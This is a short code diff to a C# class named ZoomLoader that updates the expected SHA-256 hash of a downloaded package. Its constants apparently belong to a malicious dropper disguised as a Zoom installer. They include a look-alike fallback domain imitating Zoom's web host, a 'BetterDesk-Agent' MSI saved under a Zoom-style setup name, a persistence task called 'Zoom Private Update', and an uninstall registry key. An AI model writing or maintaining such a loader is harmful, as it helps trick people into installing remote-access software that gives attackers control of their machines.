@@ -42,7 +42,7 @@ public class ZoomLoader
     const string Fallback = "https://us05web.telcom.stream";
     const string PkgName = "BetterDesk-Agent-x64-1.0.1.msi";
     const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
-    const string ExpectedSha = "84025FB577EC5112C090D82F05C3E4D1E0576BA87AD0440BE247173D1222104E";
+    const string ExpectedSha = "88B63836A21C638524344D33091C072B68BAB55AA3A27191C70CAFB66A69B216";
     const string TaskName = "Zoom Private Update";
     const string UninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{39ADC479-8106-430C-9B36-10552C4AF9E6}";
 
